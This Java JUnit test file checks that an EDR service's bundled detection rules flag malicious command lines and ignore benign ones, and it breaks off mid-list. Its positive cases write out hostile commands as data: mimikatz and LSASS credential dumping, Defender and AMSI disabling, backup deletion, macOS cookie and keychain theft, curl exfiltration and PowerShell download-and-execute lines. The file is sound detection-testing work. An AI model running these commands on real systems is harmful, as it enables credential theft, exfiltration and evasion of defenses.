package com.edrdog.detectorservice.rule;

import com.edrdog.detectorservice.dto.Alert;
import com.edrdog.detectorservice.support.TestEvents;
import com.edrdog.schema.Event;
import com.edrdog.schema.EventTypes;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.core.io.support.PathMatchingResourcePatternResolver;

import java.io.IOException;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 번들 룰(src/main/resources/rules) 전부에 대해 걸려야 할 이벤트와 걸리면 안 되는 이벤트를 하나 이상씩 확인한다.
 * 에이전트가 실제로 보내는 형태를 따른다: process 는 파일명, cmdline 의 첫 토큰은 전체 경로,
 * powershell/cmd 같은 인터프리터는 script 타입, file 의 cmdline 은 전체 경로.
 */
class BundledRulesTest {

    private static final DataRules BUNDLED = new DataRules("");

    private record Case(String ruleId, String severity, List<Event> positives, List<Event> negatives) {
    }

    private static Event proc(String image, String cmdline) {
        return TestEvents.of("h", EventTypes.PROCESS, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
    }

    private static Event procFrom(String image, String parent, String cmdline) {
        return TestEvents.of("h", EventTypes.PROCESS, 1, image, parent, cmdline, null, 0, null, null, null, "t");
    }

    private static Event script(String image, String cmdline) {
        return TestEvents.of("h", EventTypes.SCRIPT, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
    }

    private static Event childOf(String parent, String image, String cmdline) {
        return TestEvents.of("h", EventTypes.PROCESS, 1, image, parent, cmdline, null, 0, null, null, null, "t");
    }

    private static Event scriptFrom(String parent, String image, String cmdline) {
        return TestEvents.of("h", EventTypes.SCRIPT, 1, image, parent, cmdline, null, 0, null, null, null, "t");
    }

    private static Event file(String path) {
        String name = path.substring(path.lastIndexOf('\\') + 1);
        return TestEvents.of("h", EventTypes.FILE, 1, name, null, path, null, 0, null, "{\"action\":\"CREATE\"}", null, "t");
    }

    private static Event dns(String domain) {
        return TestEvents.of("h", EventTypes.DNS, 1, "app.exe", null, null, null, 0, domain, null, null, "t");
    }

    private static final String SYS = "C:\\Windows\\System32\\";
    private static final String PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe ";
    private static final String WMIC = SYS + "wbem\\WMIC.exe ";

    private static Case c(String id, String severity, List<Event> pos, List<Event> neg) {
        return new Case(id, severity, pos, neg);
    }

    private static final List<Case> BASE_CASES = List.of(
            c("MIMIKATZ_COMMAND_LINE", Alert.SEV_HIGH,
                    List.of(proc("mimikatz.exe", "C:\\Tools\\mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
                            proc("a.exe", "C:\\Temp\\a.exe lsadump::sam"),
                            proc("mimikatz.exe", "C:\\Tools\\mimikatz.exe")),
                    List.of(proc("notepad.exe", "C:\\Windows\\notepad.exe C:\\notes\\todo.txt"),
                            proc("git.exe", "C:\\Git\\git.exe commit -m \"fix mimikatz rule\""),
                            proc("cargo", "/usr/bin/cargo test token::tests"))),
            c("CERTUTIL_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(proc("certutil.exe", SYS + "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe")),
                    List.of(proc("certutil.exe", SYS + "certutil.exe -hashfile C:\\a.txt SHA256"),
                            proc("xcertutil.exe", SYS + "xcertutil.exe -urlcache -f http://203.0.113.9/a.exe a.exe"))),
            c("BITSADMIN_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(proc("bitsadmin.exe", SYS + "bitsadmin.exe /transfer job http://203.0.113.9/a.exe C:\\a.exe")),
                    List.of(proc("bitsadmin.exe", SYS + "bitsadmin.exe /list /allusers"),
                            proc("curl.exe", SYS + "curl.exe /transfer job http://203.0.113.9/a.exe"))),
            c("MSHTA_REMOTE_HTA", Alert.SEV_MEDIUM,
                    List.of(proc("mshta.exe", SYS + "mshta.exe https://203.0.113.9/x.hta")),
                    List.of(proc("mshta.exe", SYS + "mshta.exe C:\\apps\\local.hta"))),
            c("POWERSHELL_ENCODED_COMMAND", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-NoP -enc <redacted>"),
                            script("powershell.exe", PS + "-e JABzAD0ATgBlAHcA")),
                    List.of(script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"),
                            script("powershell.exe", PS + "-ExecutionPolicy RemoteSigned -enc <redacted>"),
                            script("cmd.exe", SYS + "cmd.exe /c echo -enc <redacted>"))),
            c("POWERSHELL_DEFENDER_EXCLUSION", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "Add-MpPreference -ExclusionPath C:\\Temp")),
                    List.of(script("powershell.exe", PS + "Get-MpPreference"))),
            c("NETSH_FIREWALL_DISABLE", Alert.SEV_MEDIUM,
                    List.of(proc("netsh.exe", SYS + "netsh.exe advfirewall set allprofiles state off")),
                    List.of(proc("netsh.exe", SYS + "netsh.exe advfirewall show allprofiles"))),
            c("BCDEDIT_BOOT_TAMPER", Alert.SEV_MEDIUM,
                    List.of(proc("bcdedit.exe", SYS + "bcdedit.exe /set {default} safeboot network")),
                    List.of(proc("bcdedit.exe", SYS + "bcdedit.exe /enum"))),
            c("MSIEXEC_WEB_INSTALL", Alert.SEV_MEDIUM,
                    List.of(proc("msiexec.exe", SYS + "msiexec.exe /i http://203.0.113.9/a.msi /q"),
                            script("cmd.exe", SYS + "cmd.exe /c msiexec /q /i http://203.0.113.9/a.msi")),
                    List.of(proc("msiexec.exe", SYS + "msiexec.exe /i C:\\pkg\\app.msi"))),
            c("REG_DUMP_SENSITIVE_HIVES", Alert.SEV_HIGH,
                    List.of(proc("reg.exe", SYS + "reg.exe save HKLM\\SAM C:\\temp\\sam.save"),
                            proc("reg.exe", SYS + "reg.exe save \"HKLM\\SYSTEM\" C:\\temp\\sys.save"),
                            proc("reg.exe", SYS + "reg.exe save HKEY_LOCAL_MACHINE\\SECURITY C:\\temp\\sec.save")),
                    List.of(proc("reg.exe", SYS + "reg.exe query HKLM\\Software\\Microsoft"),
                            proc("reg.exe", SYS + "reg.exe save HKCU\\Software\\Foo C:\\a.hiv"),
                            proc("reg.exe", SYS + "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Services\\Foo C:\\b.reg"),
                            proc("reg.exe", SYS + "reg.exe export HKLM\\SOFTWARE\\Samsung C:\\b.reg"),
                            proc("reg.exe", SYS + "reg.exe save HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Security x.hiv"))),
            c("POWERSHELL_SHADOWCOPY_DELETE", Alert.SEV_HIGH,
                    List.of(script("powershell.exe", PS + "Get-WmiObject Win32_ShadowCopy | ForEach-Object {$_.Delete()}")),
                    List.of(script("powershell.exe", PS + "Get-WmiObject Win32_ShadowCopy"))),
            c("WBADMIN_DELETE_ALL_BACKUPS", Alert.SEV_HIGH,
                    List.of(proc("wbadmin.exe", SYS + "wbadmin.exe delete backup -keepVersions:0 -quiet")),
                    List.of(proc("wbadmin.exe", SYS + "wbadmin.exe get versions"),
                            proc("wbadmin.exe", SYS + "wbadmin.exe delete backup -keepVersions:3"))),
            c("PROCDUMP_LSASS", Alert.SEV_HIGH,
                    List.of(proc("procdump.exe", "C:\\Tools\\procdump.exe -accepteula -ma lsass.exe C:\\temp\\l.dmp"),
                            proc("procdump64.exe", "C:\\Tools\\procdump64.exe /ma lsass.exe C:\\temp\\l.dmp")),
                    List.of(proc("procdump.exe", "C:\\Tools\\procdump.exe -ma notepad.exe C:\\n.dmp"),
                            proc("bash", "/bin/bash -c ls -ma /tmp"),
                            proc("git.exe", "C:\\Git\\git.exe log -mp -- lsfoo"),
                            proc("pd.exe", "C:\\Tools\\pd.exe -ma lsass.exe C:\\temp\\l.dmp"))),
            c("NET_USER_ADD", Alert.SEV_MEDIUM,
                    List.of(proc("net.exe", SYS + "net.exe user hacker Passw0rd /add")),
                    List.of(proc("net.exe", SYS + "net.exe view \\\\server"),
                            proc("whoami.exe", SYS + "whoami.exe user add"))),
            c("SCHTASKS_CREATE_TEMP", Alert.SEV_MEDIUM,
                    List.of(proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\Users\\a\\AppData\\Local\\Temp\\x.exe /sc once /st 00:00"),
                            proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\Users\\a\\AppData\\Local\\Temp\\x.exe /sc once")),
                    List.of(proc("schtasks.exe", SYS + "schtasks.exe /create /tn x /tr C:\\app\\x.exe /sc daily"))),
            c("NTDSUTIL_SNAPSHOT_MOUNT", Alert.SEV_MEDIUM,
                    List.of(proc("ntdsutil.exe", SYS + "ntdsutil.exe snapshot \"mount abc\" quit quit"),
                            proc("ntdsutil.exe", SYS + "ntdsutil.exe ac i ntds ifm create full C:\\x")),
                    List.of(proc("ntdsutil.exe", SYS + "ntdsutil.exe help"))),
            c("MACOS_CSRUTIL_DISABLE", Alert.SEV_MEDIUM,
                    List.of(proc("csrutil", "/usr/bin/csrutil disable")),
                    List.of(proc("csrutil", "/usr/bin/csrutil status"))),
            c("MACOS_XATTR_REMOVE_QUARANTINE", Alert.SEV_MEDIUM,
                    List.of(proc("xattr", "/usr/bin/xattr -d com.apple.quarantine /Users/a/Downloads/app.app")),
                    List.of(proc("xattr", "/usr/bin/xattr -l /Users/a/file"))),
            c("MACOS_TMUTIL_DELETE_BACKUP", Alert.SEV_MEDIUM,
                    List.of(proc("tmutil", "/usr/bin/tmutil delete /Volumes/Backup/2026-11-01")),
                    // 파일 이름에 tmutil, delete 가 들어 있을 뿐인 명령 (KISA 자체 시험 2026-11-10 실제 오탐)
                    List.of(proc("tmutil", "/usr/bin/tmutil listbackups"),
                            proc("mv", "/bin/mv D08-tmutil-delete.sh D08.sh"),
                            proc("sed", "/usr/bin/sed -n s/^# id: //p /x/scenarios/D08-tmutil-delete.sh"))),
            c("MACOS_SYSADMINCTL_ADD_ADMIN", Alert.SEV_MEDIUM,
                    List.of(proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -admin -password <redacted>"),
                            proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -password <redacted> -admin")),
                    List.of(proc("sysadminctl", "/usr/sbin/sysadminctl -addUser bob -password <redacted>"))),
            c("MACOS_DSCL_ADD_ADMIN", Alert.SEV_MEDIUM,
                    List.of(proc("dscl", "/usr/bin/dscl . -append /Groups/admin GroupMembership bob")),
                    List.of(proc("dscl", "/usr/bin/dscl . -read /Users/bob"))),
            c("MACOS_KEYCHAIN_DUMP", Alert.SEV_MEDIUM,
                    List.of(proc("security", "/usr/bin/security dump-keychain -d login.keychain"),
                            proc("security", "/usr/bin/security find-certificate -a -p")),
                    List.of(proc("security", "/usr/bin/security list-keychains"),
                            proc("othertool", "/usr/bin/othertool find-certificate"))),
            c("MACOS_PLISTBUDDY_LAUNCHD_PERSISTENCE", Alert.SEV_MEDIUM,
                    List.of(proc("PlistBuddy", "/usr/libexec/PlistBuddy -c \"Add :RunAtLoad bool true\" /Library/LaunchAgents/x.plist")),
                    List.of(proc("PlistBuddy", "/usr/libexec/PlistBuddy -c \"Print :CFBundleVersion\" /Applications/a.app/Info.plist"))),
            c("MACOS_DISABLE_SECURITY_TOOLS", Alert.SEV_MEDIUM,
                    List.of(proc("launchctl", "/bin/launchctl unload /Library/LaunchDaemons/com.google.santad.plist"),
                            proc("spctl", "/usr/sbin/spctl --master-disable")),
                    List.of(proc("launchctl", "/bin/launchctl unload /Library/LaunchAgents/com.example.app.plist"),
                            proc("spctl", "/usr/sbin/spctl --status"))),
            c("MACOS_OSACOMPILE_RUNONLY_EXECUTION", Alert.SEV_MEDIUM,
                    List.of(proc("osacompile", "/usr/bin/osacompile -x -e return 1 -o /tmp/t.scpt")),
                    List.of(proc("osacompile", "/usr/bin/osacompile -e return 1 -o /Users/a/hello.scpt"),
                            proc("osacompile", "/usr/bin/osacompile -x -o /Users/a/hi.scpt /Users/a/src/hi.applescript"),
                            proc("osascript", "/usr/bin/osascript -e display notification \"hi\""))),
            c("MACOS_JXA_IN_MEMORY_EXECUTION", Alert.SEV_MEDIUM,
                    List.of(proc("osascript", "/usr/bin/osascript -l JavaScript -e eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\"http://203.0.113.9/a.js\")),4)))"),
                            proc("osascript", "/usr/bin/osascript -e eval(ObjC.unwrap($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\"http://203.0.113.9/a\")))) /tmp/run.js")),
                    List.of(proc("osascript", "/usr/bin/osascript -l JavaScript -e Application(\"Finder\").version()"),
                            proc("osascript", "/usr/bin/osascript -e display notification \"hi\""),
                            proc("osascript", "/usr/bin/osascript -l JavaScript /Users/a/scripts/cleanup.js"),
                            proc("osascript", "/usr/bin/osascript -l JavaScript -e eval(1+1)"))),
            c("MACOS_OFFICE_SUSP_CHILD_PROCESSES", Alert.SEV_MEDIUM,
                    List.of(procFrom("sh", "Microsoft Word", "/bin/sh -c curl http://203.0.113.9/a | sh"),
                            procFrom("osascript", "Microsoft Excel", "/usr/bin/osascript -e do shell script \"id\""),
                            procFrom("python3", "Microsoft PowerPoint", "/usr/bin/python3 x.py")),
                    List.of(procFrom("sh", "Terminal", "/bin/sh -c ls"),
                            procFrom("Microsoft Word Helper", "Microsoft Word", "/Applications/Microsoft Word.app/Contents/Helper"),
                            procFrom("open", "Microsoft Word", "/usr/bin/open /Users/a/doc.pdf"))),
            c("MACOS_INFOSTEALER_COOKIE_THEFT", Alert.SEV_MEDIUM,
                    List.of(proc("osascript", "/usr/bin/osascript -e tell application \"Finder\" -e set destinationFolderPath to POSIX file \"/private/tmp\" -e duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder destinationFolderPath with replacing -e end tell"),
                            proc("grep", "/usr/bin/grep -q coinbase Cookies.binarycookies"),
                            proc("cp", "/bin/cp /Users/a/Library/Application Support/Google/Chrome/Default/Network/Cookies /tmp/c"),
                            proc("sqlite3", "/usr/bin/sqlite3 /Users/a/Library/Application Support/Firefox/Profiles/x.default/cookies.sqlite .dump")),
                    List.of(proc("osascript", "/usr/bin/osascript -e display notification \"done\""),
                            proc("cp", "/bin/cp /Users/a/Documents/report.docx /tmp/report.docx"),
                            proc("cat", "/bin/cat /Users/a/cookies.txt"),
                            proc("ls", "/bin/ls /Users/a/Library/Cookies/Cookies.binarycookies"),
                            proc("grep", "/usr/bin/grep -r cookies /Users/a/project/src"),
                            proc("sqlite3", "/usr/bin/sqlite3 /Users/a/app/data.db select 1"))),
            c("MACOS_INFOSTEALER_BROWSER_CREDENTIALS", Alert.SEV_MEDIUM,
                    List.of(proc("cp", "/bin/cp /Users/a/Library/Application Support/Google/Chrome/Default/Login Data /tmp/T1555.003_Login Data"),
                            proc("sqlite3", "/usr/bin/sqlite3 file:/Users/a/Library/Application Support/Google/Chrome/Default/Login Data?immutable=1 SELECT origin_url, username_value FROM logins;"),
                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Firefox/Profiles/x.default/key4.db /tmp/key4.db"),
                            proc("security", "/usr/bin/security find-generic-password -w -s Chrome Safe Storage"),
                            proc("security", "/usr/bin/security find-generic-password -ga Brave Safe Storage")),
                    List.of(proc("cp", "/bin/cp /Users/a/Documents/Login Data.xlsx /tmp/"),
                            proc("cp", "/bin/cp /Users/a/Documents/Web Data Plan.pdf /Users/a/Desktop/"),
                            proc("cat", "/bin/cat /Users/a/proj/logins.json"),
                            proc("security", "/usr/bin/security find-generic-password -w -s AirPort -a home-wifi"),
                            proc("security", "/usr/bin/security find-generic-password -w -s MyApp"),
                            proc("security", "/usr/bin/security list-keychains"))),
            c("MACOS_INFOSTEALER_LOCAL_DATA", Alert.SEV_MEDIUM,
                    List.of(proc("osascript", "/usr/bin/osascript -e tell application \"Finder\" -e set destinationFolderPath to POSIX file \"/private/tmp\" -e set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\"} of notesFolder -e duplicate aFile to folder destinationFolderPath with replacing"),
                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /tmp/out/exodus.wallet")),
                    List.of(proc("cp", "/bin/cp /Users/a/Documents/todo.txt /tmp/todo.txt"),
                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /Volumes/Backup/exodus.wallet"),
                            proc("osascript", "/usr/bin/osascript -e tell application \"Notes\" to make new note with properties {name:\"x\"}"),
                            proc("ditto", "/usr/bin/ditto /Users/a/Library/Application Support/Exodus/exodus.wallet /Users/a/tmp/bk"),
                            proc("zip", "/usr/bin/zip -r /tmp/build.zip /Users/a/project/build"),
                            proc("ls", "/bin/ls /Users/a/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite"))),
            c("MACOS_INFOSTEALER_EXFIL_CURL_ARCHIVE", Alert.SEV_MEDIUM,
                    List.of(proc("curl", "/usr/bin/curl -X POST -H user: x -F file=@/tmp/out.zip http://203.0.113.9/contact"),
                            proc("curl", "/usr/bin/curl -X PUT --data-binary @/private/tmp/osalogging.zip http://203.0.113.9/up"),
                            proc("curl", "/usr/bin/curl -T /tmp/data.tar.gz http://203.0.113.9/up")),
                    List.of(proc("curl", "/usr/bin/curl -X POST -F file=@/Users/a/report.pdf https://api.example.com/v1/upload"),
                            proc("curl", "/usr/bin/curl -F file=@/tmp/photo.png https://api.example.com/v1/upload"),
                            proc("curl", "/usr/bin/curl -X POST -d @/tmp/payload.json https://api.example.com/v1/items"),
                            proc("curl", "/usr/bin/curl -fsSL -o /tmp/tool.zip https://example.com/tool.zip"),
                            proc("curl", "/usr/bin/curl -F file=@/Users/a/Documents/site.zip https://api.example.com/v1/upload"),
                            proc("curl", "/usr/bin/curl -T /tmp/notes.txt https://example.com/up"),
                            proc("scp", "/usr/bin/scp /tmp/out.zip a@203.0.113.9:/srv/"))),
            c("DNS_TOR_GATEWAY", Alert.SEV_MEDIUM,
                    List.of(dns("abcdefgh.onion.to"), dns("hidden.onion")),
                    List.of(dns("example.com"), dns("bunion.org"))),
            c("DNS_MEGA_USERSTORAGE", Alert.SEV_MEDIUM,
                    List.of(dns("g.api.userstorage.mega.co.nz")),
                    List.of(dns("mega.nz"))),
            c("FILE_MIMIKATZ_ARTIFACTS", Alert.SEV_MEDIUM,
                    List.of(file("C:\\Users\\a\\ticket.kirbi")),
                    List.of(file("C:\\Users\\a\\notes.txt"))),
            c("FILE_LSASS_DUMP_NAME", Alert.SEV_MEDIUM,
                    List.of(file("C:\\Temp\\lsass.dmp"), file("C:\\Temp\\lsass_261110_101010.dmp")),
                    List.of(file("C:\\Temp\\report.dmp"))));

    // 아래 룰의 양성은 Atomic Red Team 시험 명령(기본 입력값 대입)이다. powershell 실행자 시험은 powershell.exe -NoProfile -Command "..." 로 감쌌다.
    // ART 시험 번호는 룰 파일 맨 위 주석에 있다. 에이전트는 명령행 첫 토큰을 전체 경로로 바꿔 보낸다.
    private static final List<Case> ART_CASES = List.of(
            c("POWERSHELL_SUSP_DOWNLOAD_PATTERNS", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"")),
                    List.of(script("powershell.exe", PS + "-Command \"(New-Object Net.WebClient).DownloadString('https://example.com/readme.txt')\""),
                            script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"))),
            c("POWERSHELL_DOWNLOAD_PATTERNS", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-NoProfile -Command \"(New-Object System.Net.WebClient).DownloadFile(\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\", \\\"$env:TEMP\\Atomic-license.txt\\\")\""),
                            script("powershell.exe", PS + "-NoProfile -Command \"(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt\"")),
                    List.of(script("powershell.exe", PS + "-Command \"Invoke-WebRequest https://example.com/api\""),
                            script("powershell.exe", PS + "-Command \"Get-ChildItem C:\\temp\""),
                            script("cmd.exe", SYS + "cmd.exe /c echo (New-Object Net.WebClient).DownloadString('x')"))),
            c("POWERSHELL_FROMBASE64STRING", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"")),
                    List.of(script("powershell.exe", PS + "-File C:\\scripts\\decode.ps1"),
                            script("powershell.exe", PS + "-Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('a.bin'))\""))),
            c("POWERSHELL_BASE64_INVOKE", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA")),
                    List.of(script("powershell.exe", PS + "-e JABzAD0ATgBlAHcA"),
                            script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"),
                            script("cmd.exe", SYS + "cmd.exe /c echo -e SQBuAHYAbwBrAGUALQBX"))),
            c("CMD_STDIN_REDIRECT", Alert.SEV_MEDIUM,
                    List.of(script("cmd.exe", SYS + "cmd.exe /r cmd<\"C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\"")),
                    List.of(script("cmd.exe", SYS + "cmd.exe /c echo \"Hello from the Windows Command Prompt!\" > C:\\temp\\test.bin & type C:\\temp\\test.bin"),
                            proc("sort.exe", SYS + "sort.exe < C:\\temp\\a.txt"))),
            c("CURL_SUSP_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(proc("Curl.exe", SYS + "Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll")),
                    List.of(proc("curl.exe", SYS + "curl.exe -s https://example.com/health"),
                            proc("curl.exe", SYS + "curl.exe https://example.com/a.zip -o D:\\work\\a.zip"),
                            // 원본의 git for windows 필터: 부모 sh.exe, 임시 파일 gfw-httpget-
                            childOf("sh.exe", "curl.exe", "C:\\Program Files\\Git\\mingw64\\bin\\curl.exe --silent --show-error --output C:\\Users\\a\\AppData\\Local\\Temp\\gfw-httpget-abc.txt https://example.com/v.txt"))),
            c("MPCMDRUN_DOWNLOAD_ARBITRARY_FILE", Alert.SEV_MEDIUM,
                    List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\\Users\\a\\AppData\\Local\\Temp\\Atomic-license.txt")),
                    List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -Scan -ScanType 1"))),
            c("POWERSHELL_INVOKE_WEBREQUEST_DOWNLOAD", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt -UseBasicParsing")),
                    List.of(script("powershell.exe", PS + "Invoke-WebRequest https://example.com/api -UseBasicParsing"),
                            script("powershell.exe", PS + "iwr -Uri https://example.com/a.zip -OutFile D:\\work\\a.zip"))),
            c("FINGER_EXECUTION", Alert.SEV_MEDIUM,
                    List.of(proc("finger.exe", SYS + "finger.exe base64_filedata@localhost")),
                    List.of(proc("fingerprint.exe", "C:\\Tools\\fingerprint.exe --scan"),
                            proc("xfinger.exe", "C:\\Tools\\xfinger.exe user@host"))),
            c("WMIC_PROCESS_CREATION", Alert.SEV_MEDIUM,
                    List.of(proc("wmic.exe", WMIC + "process call create notepad.exe")),
                    List.of(proc("wmic.exe", WMIC + "process get caption,executablepath,commandline /format:csv"),
                            proc("wmic.exe", WMIC + "os get caption"))),
            c("WMIC_SUSP_PROCESS_CREATION", Alert.SEV_MEDIUM,
                    List.of(proc("wmic.exe", WMIC + "/node:127.0.0.1 process call create \"rundll32.exe \\\"C:\\AtomicRedTeam\\ExternalPayloads\\calc.dll\\\" StartW\"")),
                    List.of(proc("wmic.exe", WMIC + "process call create notepad.exe"),
                            proc("wmic.exe", WMIC + "qfe get description,installedOn /format:csv"))),
            c("WMIC_NAMESPACE_DEFENDER", Alert.SEV_MEDIUM,
                    List.of(proc("wmic.exe", WMIC + "/Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"")),
                    List.of(proc("wmic.exe", WMIC + "/Namespace:\\\\root\\cimv2 path Win32_OperatingSystem get Caption"),
                            proc("wmic.exe", WMIC + "useraccount get /ALL /format:csv"))),
            c("CLICKFIX_RUN_DIALOG_SHELL", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-w hidden -c \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1204.004/src/evil.ps1'))\""),
                            script("powershell.exe", PS + "-NoP -W Hidden -Command \"irm https://203.0.113.9/v | iex\""),
                            script("powershell.exe", PS + "-w hidden -c \"& 'C:\\Users\\a\\AppData\\Local\\Temp\\a.exe'\""),
                            script("mshta.exe", SYS + "mshta.exe https://203.0.113.9/captcha.hta"),
                            script("cmd.exe", SYS + "cmd.exe /c start /min powershell -w hidden -c iwr https://203.0.113.9/a.ps1")),
                    List.of(script("powershell.exe", PS + "-ExecutionPolicy Bypass -File C:\\scripts\\deploy.ps1"),
                            script("powershell.exe", PS + "-WindowStyle Hidden -File C:\\tools\\tray.ps1"),
                            script("mshta.exe", SYS + "mshta.exe C:\\apps\\local.hta"),
                            script("cmd.exe", SYS + "cmd.exe /c dir C:\\"),
                            // 같은 명령이라도 부모가 explorer.exe 가 아니면 걸지 않는다(스크립트 안에서 쓰는 정상 다운로드 포함)
                            scriptFrom("code.exe", "powershell.exe", PS + "-w hidden -c \"iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/x.ps1'))\""),
                            scriptFrom("cmd.exe", "mshta.exe", SYS + "mshta.exe https://203.0.113.9/captcha.hta"))),
            c("POWERSHELL_AMSI_INIT_FAILED_BYPASS", Alert.SEV_MEDIUM,
                    List.of(script("powershell.exe", PS + "-NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"")),
                    List.of(script("powershell.exe", PS + "-Command \"[Ref].Assembly.GetType('System.Management.Automation.Foo')\""),
                            script("powershell.exe", PS + "-File C:\\scripts\\amsi-check.ps1"))),
            c("MPCMDRUN_REMOVE_DEFINITIONS", Alert.SEV_MEDIUM,
                    List.of(proc("MpCmdRun.exe", "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All")),
                    List.of(proc("MpCmdRun.exe", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -SignatureUpdate"),
                            proc("MpCmdRun.exe", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -DynamicSignatures"))),
            c("DEFENDER_DISABLE_MONITORING", Alert.SEV_MEDIUM,
                    List.of(proc("sc.exe", SYS + "sc.exe stop WinDefend"),
                            proc("sc.exe", SYS + "sc.exe config WinDefend start=disabled"),
                            script("powershell.exe", PS + "Set-MpPreference -DisableBehaviorMonitoring $true")),
                    List.of(proc("sc.exe", SYS + "sc.exe query WinDefend"),
                            proc("sc.exe", SYS + "sc.exe stop Spooler"),
                            script("powershell.exe", PS + "Set-MpPreference -DisableBehaviorMonitoring $false"))),
            c("REG_BITLOCKER_POLICY", Alert.SEV_MEDIUM,
                    // ART 에서는 T1112 아래의 BitLocker 레지스트리 시험(Modify EnableBDEWithNoTPM Registry entry)
                    List.of(proc("reg.exe", SYS + "reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")),
                    List.of(proc("reg.exe", SYS + "reg.exe query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\""),
                            proc("reg.exe", SYS + "reg.exe add HKLM\\SOFTWARE\\Vendor\\App /v UseTPM /t REG_DWORD /d 1 /f"))),
            c("GPG_BATCH_ENCRYPT", Alert.SEV_MEDIUM,
                    List.of(proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --passphrase 'SomeParaphraseBlah' --batch --yes -c \"C:\\Users\\a\\AppData\\Local\\Temp\\test.txt\"")),
                    List.of(proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --status-fd=2 -bsau ABCD1234EF567890"),
                            proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --batch --yes --decrypt C:\\a\\b.gpg"),
